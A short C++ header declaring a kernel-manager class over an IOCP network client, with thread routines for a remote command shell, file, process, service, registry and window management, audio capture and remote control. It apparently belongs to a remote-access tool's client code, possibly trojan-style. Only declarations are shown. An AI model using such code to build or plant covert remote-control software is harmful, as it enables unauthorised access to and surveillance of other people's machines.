#pragma once
#include "Manager.h"
#include "IOCPClient.h"



class CIOCPClient;

class CKernelManager : 
	public CManager
{
public:
	CKernelManager(CIOCPClient* IOCPClient);
	virtual ~CKernelManager();

public:
	virtual void PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	VOID SysShutDown();

protected:
	HANDLE  _M_hThread[0x1000];
	int		_M_ThreadCounts;
};


DWORD WINAPI _InstantMessageProc (LPVOID lParam);
DWORD WINAPI _CMDManagerProc     (LPVOID lParam);
DWORD WINAPI _ProcessManagerProc (LPVOID lParam);
DWORD WINAPI _WindowManagerProc  (LPVOID lParam);
DWORD WINAPI _RemoteControlProc  (LPVOID lParam);
DWORD WINAPI _FileManagerProc    (LPVOID lParam);
DWORD WINAPI _ServiceManagerProc (LPVOID lParam);
DWORD WINAPI _AudioManagerProc   (LPVOID lParam);
DWORD WINAPI _RegistryManagerProc(LPVOID lParam);
